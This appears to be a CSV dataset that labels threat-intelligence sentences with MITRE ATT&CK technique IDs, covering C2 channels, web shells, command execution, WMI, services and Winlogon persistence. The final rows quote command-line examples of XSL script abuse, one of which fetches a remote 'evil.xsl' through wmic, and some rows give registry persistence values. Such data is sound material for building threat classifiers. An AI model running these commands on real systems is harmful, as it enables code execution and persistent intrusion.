label_tec,sentence
T1071,Anchor has used HTTP and HTTPS in C2 communications.
T1071,SoreFang can use HTTP in C2 communications.
T1071,Crutch has conducted C2 communications with a Dropbox account using the HTTP API.
T1071,Egregor has communicated with its C2 servers via HTTPS protocol.
T1071,GuLoader can use HTTP to retrieve additional binaries.
T1071,LookBack’s C2 proxy tool sends data to a C2 server over HTTP.
T1071,Sibot communicated with its C2 server via HTTP GET requests.
T1071,Ramsay has used HTTP for C2.
T1071,ThiefQuest uploads files via unencrypted HTTP.
T1071,AppleSeed has the ability to communicate with C2 over HTTP.
T1071,SideTwist has used HTTP GET and POST requests over port 443 for C2.
T1071,GrimAgent has the ability to use HTTP for C2 communications.
T1071,QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.
T1071,BoomBox has used HTTP POST requests for C2.
T1071,Threat Group-3390 malware has used HTTP for C2.
T1071,FIN4 has used HTTP POST requests to transmit data.
T1071,"Inception has used HTTP, HTTPS, and WebDav in network communications."
T1071,Wizard Spider has used HTTP for network communications.
T1071,Tropic Trooper has used HTTP in communication with the C2.
T1071,APT39 has used HTTP in communications with C2.
T1071,Higaisa used HTTP and HTTPS to send data back to its C2 server.
T1071,Machete malware used Python’s urllib library to make HTTP requests to the C2 server.
T1102,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system."
T1102,Bazar downloads have been hosted on Google Docs.
T1102,"DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions."
T1102,NETWIRE has used web services including Paste.ee to host payloads.
T1102,GuLoader has the ability to download malware from Google Drive.
T1102,FIN6 has used Pastebin and Google Storage to host content for their operations.
T1102,"Rocke has used Pastebin, Gitee, and GitLab for Command and Control."
T1102,Fox Kitten has used Amazon Web Services to host C2.
T1102,Chimera has used Google Cloud's appspot service to host C2 servers.
T1583,"APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads."
T1583,Lazarus Group has hosted malicious downloads on Github.
T1583,IndigoZebra created Dropbox accounts for their operations.
T1584,"Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control  or Exfiltration Over Web Service."
T1584,"By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them."
T1550,There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.
T1550,UNC2452 used a forged duo-sid cookie to bypass MFA set on an email account.
T1505,The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services .
T1505,China Chopper's server component is a Web Shell payload.
T1505,OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390.
T1505,Webshell can gain remote access and execution on target web servers.
T1505,APT32 has used Web shells to maintain access to victim websites.
T1505,Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.
T1505,GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.
T1505,Fox Kitten has installed web shells on compromised hosts to maintain access.
T1059,Adversaries may leverage cmd to execute various commands and payloads.
T1059,A module in CozyCar allows arbitrary commands to be executed by invoking C:\Windows\System32\cmd.exe.
T1059,Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.
T1059,H1N1 kills and disables services by using cmd.exe.
T1059,SEASHARPEE can execute commands on victims.
T1059,OceanSalt has been executed via malicious macros.
T1059,Kasidet can execute commands using cmd.exe.
T1059,InnaputRAT launches a shell to execute commands on the victim’s machine.
T1059,Pisloader uses cmd.exe to set the Registry Run key value.
T1059,Bankshot uses the command-line interface to execute arbitrary commands.
T1059,OopsIE uses the command prompt to execute commands on the victim's machine.
T1059,Felismus uses command line for execution.
T1059,It can also provide a reverse shell.
T1059,Mis-Type uses cmd.exe to run commands for enumerating the host.
T1059,One version of Helminth uses batch scripting.
T1059,BADNEWS is capable of executing commands via cmd.exe.
T1059,RATANKBA uses cmd.exe to execute commands.
T1059,Daserf can execute shell commands.
T1059,Dipsind can spawn remote shells.
T1059,MURKYTOP uses the command-line interface.
T1059,TURNEDUP is capable of creating a reverse shell.
T1059,SeaDuke is capable of executing commands.
T1059,SamSam uses custom batch scripts to execute some of its components.
T1059,Ixeshe is capable of executing commands via cmd.
T1059,"HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line."
T1059,"MoonWind uses batch scripts for various purposes, including to restart and uninstall itself."
T1059,Rising Sun executed commands using cmd.exe.
T1059,The Maze encryption process has used batch scripts with various commands.
T1059,Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.
T1059,Anchor has used cmd.exe to run its self deletion routine.
T1059,BLINDINGCAN has executed commands via cmd.exe.
T1059,Cobalt Strike uses a command-line interface to interact with systems.
T1059,Bazar can launch cmd.exe to perform reconnaissance commands.
T1059,SharpStage can execute arbitrary commands with the command line.
T1059,NETWIRE can issue commands using cmd.exe.
T1059,BlackMould can run cmd.exe with parameters.
T1059,LookBack executes the cmd.exe command.
T1059,ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.
T1059,Clop can use cmd.exe to help execute commands on the system.
T1059,Babuk has the ability to use the command line to control execution on compromised hosts.
T1059,xCaon has a command to start an interactive shell.
T1059,Seth-Locker can execute commands via the command line shell.
T1059,"APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution."
T1059,Magic Hound has used the command-line interface.
T1059,menuPass has used malicious macros embedded inside Office documents to execute files.
T1059,FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities.
T1059,APT18 uses cmd.exe to execute commands on the victim’s machine.
T1059,Patchwork used JavaScript code and .SCT files on victim machines.
T1059,APT32 has used cmd.exe for execution.
T1059,FIN7 used the command prompt to launch commands on the victim’s machine.
T1059,A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.
T1059,OilRig has used macros to deliver malware such as QUADAGENT and OopsIE.
T1059,TA551 has used cmd.exe to execute commands.
T1059,Sandworm Team has run the  xp_cmdshell command in MS-SQL.
T1555,"The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers ."
T1555,"The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials."
T1555,Adversaries may also abuse Windows APIs such as CredEnumerateA to list credentials managed by the Credential Manager.
T1555,Turla has gathered credentials from the Windows Credential Manager tool.
T1555,OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.
T1222,"Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object."
T1222,"Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders."
T1047,"An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement."
T1047,A BlackEnergy 2 plug-in uses WMI to gather victim host details.
T1047,RATANKBA uses WMI to perform process monitoring.
T1047,Octopus has used wmic.exe for local discovery information.
T1047,NotPetya can use wmic to help propagate itself across a network.
T1047,HOPLIGHT has used WMI to recompile the Managed Object Format  files in the WMI repository.
T1047,FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.
T1047,Emotet has used WMI to execute powershell.exe.
T1047,Cobalt Strike can use WMI to deliver a payload to a remote host.
T1047,Agent Tesla has used wmi queries to gather information from the system.
T1047,MoleNet can perform WMI commands on the system.
T1047,MuddyWater has used malware that leveraged WMI for execution and querying host information.
T1047,Leviathan has used WMI for execution.
T1047,FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.
T1047,FIN6 has used WMI to automate the remote execution of PowerShell scripts.
T1047,"APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit."
T1047,Blue Mockingbird has used wmic.exe to set environment variables.
T1546,Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation  event subscription.
T1546,SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.
T1546,FIN8 has used WMI event subscriptions for persistence.
T1021,APT29 has used WinRM via PowerShell to execute command and payloads on remote hosts.
T1543,"When Windows boots up, it starts programs or applications called services that perform background system functions."
T1543,Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.
T1543,TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
T1543,Kwampirs creates a new service named WmiApSrvEx to establish persistence.
T1543,"When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key."
T1543,Wiarp creates a backdoor through which remote attackers can create a service.
T1543,Emissary is capable of configuring itself as a service.
T1543,"If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence."
T1543,Naid creates a new service to establish.
T1543,"Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry."
T1543,PlugX can be added as a service to establish persistence.
T1543,"PlugX also has a module to change service configurations as well as start, control, and delete services."
T1543,GoldenSpy has established persistence by running in the background as an autostart service.
T1543,Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.
T1543,APT32 also creates a Windows service to establish persistence.
T1543,Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.
T1543,TeamTNT uses malware that adds cryptocurrency miners as a service.
T1547,"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
T1547,"Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon."
T1547,Remexi achieves persistence using Userinit by adding the Registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit.
T1547,Bazar can use Winlogon Helper DLL to establish persistence.
T1547,Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user.
T1547,Adversaries may also use Masquerading to make XDG autostart entries look as if they are associated with legitimate programs.
T1220,Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.
T1220,"Command-line examples:
* msxsl.exe customers.xml script.xsl
* msxsl.exe script.xsl script.xsl
* msxsl.exe script.jpeg script.jpeg
Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file."
T1220,"Command-line examples:
* Local File: wmic process list /FORMAT:evil.xsl
* Remote File: wmic os get /FORMAT:”https://example.com/evil.xsl” Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain."
